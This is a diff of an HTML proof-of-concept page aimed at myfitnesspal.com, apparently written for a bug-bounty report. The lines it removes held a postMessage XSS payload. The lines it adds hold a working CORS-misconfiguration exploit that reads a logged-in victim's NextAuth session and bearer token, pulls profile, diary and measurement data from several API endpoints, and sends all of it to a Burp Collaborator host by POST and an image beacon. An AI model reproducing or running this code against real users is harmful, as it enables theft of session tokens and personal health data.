@@ -1,31 +1,236 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC – F-001: CORS ACAO+ACAC on api.myfitnesspal.com</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', monospace; background: #0d1117; color: #e6edf3; padding: 32px; }
+  h1 { color: #f0883e; font-size: 1.3rem; margin-bottom: 6px; }
+  .subtitle { color: #8b949e; font-size: 0.85rem; margin-bottom: 28px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
+  .card h2 { color: #58a6ff; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 12px; }
+  button { background: #da3633; border: none; border-radius: 6px; color: #fff; padding: 10px 24px; font-size: 0.9rem; cursor: pointer; font-weight: 700; }
+  button:hover { background: #f85149; }
+  .log { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 16px; min-height: 100px; font-size: 0.78rem; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin-top: 14px; }
+  .ok   { color: #3fb950; }
+  .err  { color: #f85149; }
+  .info { color: #58a6ff; }
+  .warn { color: #d29922; }
+  .dim  { color: #484f58; }
+  .data-box { background: #0d1117; border: 1px solid #238636; border-radius: 6px; padding: 16px; margin-top: 12px; display: none; }
+  .data-box h3 { color: #3fb950; font-size: 0.8rem; text-transform: uppercase; margin-bottom: 8px; }
+  .data-box pre { font-size: 0.78rem; color: #e6edf3; white-space: pre-wrap; word-break: break-all; }
+  .step-label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; }
+</style>
+</head>
 <body>
-<script>
-(function(){
-  // payload we want parent to insert (img onerror is reliable)
-  const payload = '<img src=x onerror=alert(document.domain)>';
 
-  // Try to derive parent origin from document.referrer
-  let parentOrigin = '*';
+<h1>PoC — F-001: CORS ACAO+ACAC Two-Step Exfil</h1>
+<div class="subtitle">
+  Step 1: steal accessToken from NextAuth session (cookie auth) &nbsp;→&nbsp;
+  Step 2: use token to call api.myfitnesspal.com &nbsp;→&nbsp;
+  Step 3: POST to Collaborator
+</div>
+
+<div class="card">
+  <p style="font-size:0.83rem;color:#c9d1d9;line-height:1.8;margin-bottom:14px;">
+    Make sure you are <strong>logged into myfitnesspal.com</strong> in this browser, then click the button.
+    The attack will run automatically: steal session → extract Bearer token → steal profile data → exfil all to Collaborator.
+  </p>
+  <button onclick="runAttack()">▶ Run Full Attack Chain</button>
+  <div id="main-log" class="log"><span class="dim">// Waiting — click button above</span></div>
+</div>
+
+<div class="card">
+  <div class="step-label">Step 1 result — NextAuth session (/api/auth/session)</div>
+  <div id="session-box" class="data-box">
+    <h3>Session data stolen</h3>
+    <pre id="session-data"></pre>
+  </div>
+</div>
+
+<div class="card">
+  <div class="step-label">Step 2 result — MFP API profile (api.myfitnesspal.com)</div>
+  <div id="profile-box" class="data-box">
+    <h3>Profile data stolen</h3>
+    <pre id="profile-data"></pre>
+  </div>
+</div>
+
+<div class="card">
+  <div class="step-label">Step 3 — Collaborator exfil payload</div>
+  <div id="exfil-box" class="data-box" style="border-color:#f85149;">
+    <h3 style="color:#f85149;">Sent to hh28ce3fhlxd7lx7kip6rx3x3o9fx6lv.oastify.com</h3>
+    <pre id="exfil-data"></pre>
+  </div>
+</div>
+
+<script>
+const COLLAB = 'https://hh28ce3fhlxd7lx7kip6rx3x3o9fx6lv.oastify.com';
+
+const log = (msg, cls='') => {
+  const d = document.getElementById('main-log');
+  if (d.children.length === 1 && d.children[0].classList.contains('dim')) d.innerHTML = '';
+  const span = document.createElement('span');
+  if (cls) span.className = cls;
+  span.textContent = msg + '\n';
+  d.appendChild(span);
+  d.scrollTop = d.scrollHeight;
+};
+
+async function runAttack() {
+  document.getElementById('main-log').innerHTML = '';
+  log('=== ATTACK STARTED ===', 'warn');
+  log(`Attacker origin: ${window.location.origin}`, 'dim');
+  log('');
+
+  // ── STEP 1: steal NextAuth session (uses MFP session cookie, no Bearer needed) ──
+  log('[1/3] Fetching /api/auth/session with credentials:include ...', 'info');
+
+  let sessionJson = null;
+  let accessToken = null;
+  let username = null;
+
   try {
-    if (document.referrer) {
-      parentOrigin = new URL(document.referrer).origin;
+    const sessionResp = await fetch('https://www.myfitnesspal.com/api/auth/session', {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors',
+    });
+
+    log(`     ← HTTP ${sessionResp.status}  ACAO: ${sessionResp.headers.get('access-control-allow-origin')}  ACAC: ${sessionResp.headers.get('access-control-allow-credentials')}`, 'ok');
+
+    const sessionText = await sessionResp.text();
+    try { sessionJson = JSON.parse(sessionText); } catch(e) { sessionJson = sessionText; }
+
+    const pretty = JSON.stringify(sessionJson, null, 2);
+    document.getElementById('session-data').textContent = pretty;
+    document.getElementById('session-box').style.display = 'block';
+
+    // extract token and username from NextAuth session shape
+    accessToken = sessionJson?.accessToken
+                || sessionJson?.token?.accessToken
+                || sessionJson?.user?.accessToken
+                || null;
+
+    username = sessionJson?.user?.name
+             || sessionJson?.user?.email
+             || sessionJson?.user?.username
+             || 'mytestaccount6';
+
+    if (accessToken) {
+      log(`     ✅ accessToken extracted: ${accessToken.slice(0,40)}...`, 'ok');
+    } else {
+      log(`     ⚠ No accessToken in session — will try cookie-only call to API`, 'warn');
+      log(`     Session keys: ${Object.keys(sessionJson || {}).join(', ')}`, 'dim');
     }
-  } catch(e){
-    parentOrigin = '*';
+
+  } catch (err) {
+    log(`     ✗ Session fetch failed: ${err.message}`, 'err');
+    log(`     → Make sure you are logged in and serving via HTTP (not file://)`, 'dim');
+    return;
   }
 
-  // Send multiple variants (raw HTML, JSON, object) in case parent expects a specific shape
-  try { parent.postMessage(payload, parentOrigin); } catch(e) {}
-  try { parent.postMessage(JSON.stringify({html: payload}), parentOrigin); } catch(e) {}
-  try { parent.postMessage({html: payload}, parentOrigin); } catch(e) {}
+  log('');
 
-  // repeat after a short delay (some parents attach listeners late)
-  setTimeout(()=> {
-    try { parent.postMessage(payload, parentOrigin); } catch(e) {}
-  }, 500);
-})();
+  // ── STEP 2: use token (or cookie) to call api.myfitnesspal.com ──
+  log('[2/3] Fetching api.myfitnesspal.com with Bearer token + credentials:include ...', 'info');
+
+  let profileJson = null;
+
+  const apiHeaders = { 'mfp-client-id': 'mfp-main-js-sdk' };
+  if (accessToken) apiHeaders['Authorization'] = `Bearer ${accessToken}`;
+
+  // try multiple endpoints — whichever returns 200 wins
+  const apiTargets = [
+    `https://api.myfitnesspal.com/v2/users/${username}`,
+    `https://api.myfitnesspal.com/v2/users/mytestaccount6`,
+    `https://www.myfitnesspal.com/api/services/diary/day?date=${new Date().toISOString().slice(0,10)}`,
+    `https://www.myfitnesspal.com/api/user-measurements/measurements`,
+    `https://www.myfitnesspal.com/api/services/paid-subscriptions/active`,
+  ];
+
+  let profileText = null;
+  let usedUrl = null;
+  let profileStatus = null;
+
+  for (const target of apiTargets) {
+    try {
+      log(`     → Trying: ${target}`, 'dim');
+      const r = await fetch(target, {
+        method: 'GET',
+        credentials: 'include',
+        headers: apiHeaders,
+        mode: 'cors',
+      });
+      const t = await r.text();
+      log(`       ← HTTP ${r.status}  ACAO: ${r.headers.get('access-control-allow-origin')}`, r.ok ? 'ok' : 'warn');
+
+      if (r.ok && t && t !== '{}' && t !== '[]') {
+        profileText = t;
+        usedUrl = target;
+        profileStatus = r.status;
+        log(`     ✅ Got data from: ${target} (${t.length} bytes)`, 'ok');
+        break;
+      }
+    } catch (e) {
+      log(`       ✗ ${e.message}`, 'err');
+    }
+  }
+
+  if (profileText) {
+    try { profileJson = JSON.parse(profileText); } catch(e) { profileJson = profileText; }
+    document.getElementById('profile-data').textContent = JSON.stringify(profileJson, null, 2);
+    document.getElementById('profile-box').style.display = 'block';
+  } else {
+    log(`     ⚠ All API endpoints returned no usable data`, 'warn');
+  }
+
+  log('');
+
+  // ── STEP 3: exfil everything to Collaborator ──
+  log('[3/3] Exfiltrating to Collaborator ...', 'info');
+
+  const exfilPayload = {
+    poc: 'F-001-MFP-CORS-ACAO-ACAC',
+    timestamp: new Date().toISOString(),
+    attacker_origin: window.location.origin,
+    victim_session: sessionJson,
+    victim_access_token: accessToken,
+    victim_profile_url: usedUrl,
+    victim_profile_status: profileStatus,
+    victim_profile: profileJson,
+  };
+
+  const payloadStr = JSON.stringify(exfilPayload, null, 2);
+  document.getElementById('exfil-data').textContent = payloadStr;
+  document.getElementById('exfil-box').style.display = 'block';
+
+  try {
+    await fetch(`${COLLAB}/exfil`, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: payloadStr,
+    });
+    log(`✅ POST fired to ${COLLAB}/exfil`, 'ok');
+    log(`   Check your Collaborator — look for a POST /exfil with JSON body`, 'ok');
+  } catch (e) {
+    // no-cors throws on some browsers but the request still goes out
+    log(`   no-cors threw (expected): ${e.message}`, 'dim');
+    log(`   Check Collaborator anyway — fire-and-forget still hits the server`, 'warn');
+  }
+
+  // also send a GET beacon as backup (image ping — guaranteed to fire)
+  const beaconUrl = `${COLLAB}/beacon?poc=F001&token=${encodeURIComponent((accessToken||'none').slice(0,30))}&user=${encodeURIComponent(username)}`;
+  new Image().src = beaconUrl;
+  log(`   Beacon GET also fired: /beacon?poc=F001&user=${username}`, 'dim');
+
+  log('');
+  log('=== ATTACK COMPLETE — check Collaborator ===', 'warn');
+}
 </script>
+
 </body>
 </html>
